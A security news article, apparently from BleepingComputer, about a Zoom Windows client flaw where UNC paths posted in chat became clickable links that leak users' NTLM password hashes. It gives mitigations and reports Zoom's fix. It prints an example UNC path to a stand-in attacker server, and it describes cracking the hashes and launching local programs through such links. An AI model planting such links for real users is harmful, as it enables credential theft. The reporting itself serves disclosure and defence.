@@ -1,0 +1,227 @@
+
+	   
+
+
+The Zoom Windows client is vulnerable to UNC path injection in the client's chat feature that could allow attackers to steal the Windows credentials of users who click on the link.
+
+When using the Zoom client, meeting participants can communicate with each other by sending text messages through a chat interface.
+
+When sending a chat message, any URLs that are sent are converted into hyperlinks so that other members can click on them to open a web page in their default browser.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}The problem is that security researcher @_g0dmode discovered that the Zoom client will convert Windows networking UNC paths into a clickable link in the chat messages as well.
+
+
+UNC Injection in Zoom chat
+
+As you can see from the chat messages above, a regular URL and the UNC path of \\evil.server.com\images\cat.jpg were both converted into a clickable link in the chat message.
+
+You may be wondering what is so bad about that?
+
+If a user clicks on a UNC path link, Windows will attempt to connect to the remote site using the SMB file-sharing protocol to open the remote cat.jpg file.
+
+When doing this, by default Windows will send the user's login name and their NTLM password hash, which can be cracked using free tools like Hashcat to dehash, or reveal, the user's password.
+
+Security research Matthew Hickey (@HackerFantastic), tested the UNC injection in Zoom and as you can see below was able to capture the NTLM password hashes being sent to a server hosting the clicked on share. BleepingComputer was also able to verify the same results in a local test.
+
+
+Capturing NTLM password hashes
+
+What makes this particularly problematic is that with the current power of our graphics cards and CPUs, a program like Hashcat can dehash passwords quickly. For example, the below hash for a fairly easy password was dehashed in just 16 seconds.
+
+
+
+In addition to the stealing of Windows credentials, Hickey told BleepingComputer that the UNC injects can also be used to launch programs on a local computer when a link is clicked.
+
+Hickey's technique users a UNC path to \\127.0.0.1, which made any file executed from it have the Mark-of-The-Web (MoTW). This will cause Windows to display a prompt asking if you wish to run the program.
+
+Google security researcher Tavis Ormandy illustrated that using a DOS device path instead can be used to open an application without prompting a user,  This is because the executable is local rather than from the web and thus won't contain the MoTW.
+
+BleepingComputer confirmed that this worked and you can see a demonstration of it below.
+
+
+
+To ultimately fix this issue, Zoom needs to prevent the chat system from converting UNC paths into clickable hyperlinks.
+
+In a statement to BleepingComputer, Zoom stated that they are working on addressing the UNC issue.
+
+"At Zoom, ensuring the privacy and security of our users and their data is paramount.  We are aware of the UNC issue and are working to address it," Zoom told BleepingComputer.
+
+On Tuesday, Zoom released version  4.6.19253.0401 of their client that now prevents ALL posted links, including normal URLs and UNC paths, from being converted into clickable hyperlinks.
+
+
+Fixed by removing clickable links
+
+Preventing NTLM credentials from being sent to remote servers
+
+For those who do not want to wait for a fix, there is a Group Policy that can be enabled that prevents your NTML credentials from automatically being sent to a remote server when clicking on a UNC link.
+
+This policy is called 'Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers' and is found under the following path in the Group Policy Editor.
+
+Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers
+
+If this policy is configured to Deny All, Windows will no longer automatically send your NTLM credentials to a remote server when accessing a share.
+
+
+Group Policy
+
+It should be noted that when this policy is configured on domain-joined machines, it could cause issues when attempting to access shares.  You can view this article to learn more about adding exceptions to the above policy.
+
+If you are a Windows 10 Home user, you will not have access to the Group Policy Editor and will have to use the Windows Registry to configure this policy.
+
+This can be done by creating the RestrictSendingNTLMTraffic Registry value under the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 key and setting it to 2.
+
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0]
+"RestrictSendingNTLMTraffic"=dword:00000002
+
+
+To properly create this value, Windows users will need to launch the Registry Editor as an Administrator. When the above Registry settings are properly configured, the RestrictSendingNTLMTraffic value will look like the following image. 
+
+
+Windows Registry Editor
+
+When configuring this policy, it is not necessary to reboot your computer. 
+
+To revert to the default Windows behavior of sending your NTLM credentials, you can just disable the policy by deleting the RestrictSendingNTLMTraffic value.
+
+4/1/20: Updated title, added Zoom's statement, and illustrated Tavis Ormandy's method of running local files without the MoTW alert.4/2/20: Zoom issued a patch that prevents ALL posted links from being converted into clickable hyperlinks.
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     New Ghost Calls tactic abuses Zoom and Microsoft Teams for C2 operationsNorth Korean hackers deepfake execs in Zoom call to spread Mac malware
+	  
+ 
+	  
